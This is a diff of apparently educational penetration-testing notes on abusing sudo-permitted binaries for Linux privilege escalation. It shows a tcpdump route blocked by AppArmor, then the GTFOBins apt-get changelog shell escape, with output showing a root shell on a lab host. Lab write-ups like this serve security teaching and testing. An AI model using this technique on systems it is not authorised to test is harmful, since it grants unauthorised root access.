@@ -14,7 +14,7 @@ layout:
 
 # Abusing Sudo Binaries
 
-As described in the [manual enumeration](../enumeration/manual-enumeration.md#sudo-permissions) section, `sudo` permissions can be given on a per-binary basis. Thus allowing non-privileged users to run certain commands with elevated privileges. GTFOBins contains many payloads that can turn these temporary permissions into extended privilege escalation.
+As described in the [manual enumeration](../enumeration/manual-enumeration.md#sudo-permissions) section, `sudo` permissions can be given on a per-binary basis. Thus allowing non-privileged users to run certain commands with elevated privileges. [GTFOBins](https://gtfobins.github.io/) contains many payloads that can turn these temporary permissions into extended privilege escalation.
 
 Consider the case where non-privileged (and compromised) user `joe` has the following `sudo` permissions:
 
@@ -28,7 +28,7 @@ User joe may run the following commands on debian-privesc:
     (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
 ```
 
-Obviously crontab -l is out. However the is a potential exploit for tcpdump. Unfortunately as described in the [AppArmor section](../defenses/apparmor.md), this path is blocked by AppArmor:
+Obviously `crontab -l` is out. However the is a potential exploit for `tcpdump`. Unfortunately as described in the [AppArmor section](../defenses/apparmor.md), this path is blocked by AppArmor:
 
 {% code overflow="wrap" %}
 ```shell-session
@@ -55,7 +55,13 @@ Oct 29 14:24:15 debian-privesc kernel: [ 3205.049751] audit: type=1400 audit(169
 ```
 {% endcode %}
 
-Unfortunately, GTFOBins is not infallible. This means it is time to proceed to the final elevated binary, apt-get. Fortunately there is again a [payload](https://gtfobins.github.io/gtfobins/apt-get/#sudo) for this:
+Unfortunately, GTFOBins is not infallible. This means it is time to proceed to the final elevated binary, `apt-get`.
+
+### Abusing `apt-get`
+
+Fortunately there is again a [payload](https://gtfobins.github.io/gtfobins/apt-get/#sudo) for the `apt-get` command and `sudo`:
+
+<figure><img src="../../../.gitbook/assets/AbusingSudo-Apt_GetGTFOBins.png" alt=""><figcaption><p>apt-get's GTFOBins page</p></figcaption></figure>
 
 ```bash
 sudo apt-get changelog apt
@@ -65,7 +71,7 @@ sudo apt-get changelog apt
 * The first line opens a screen that allows the user to run a command
 * The second line is the command used which results in opening an elevated shell
 
-This does appear to work on the target machine:
+When run, this does appear to work on the target machine:
 
 ```shell-session
 joe@debian-privesc:~$ sudo apt-get changelog apt
@@ -78,3 +84,5 @@ root
 # id
 uid=0(root) gid=0(root) groups=0(root)
 ```
+
+Privileges were successfully escalated via this method.
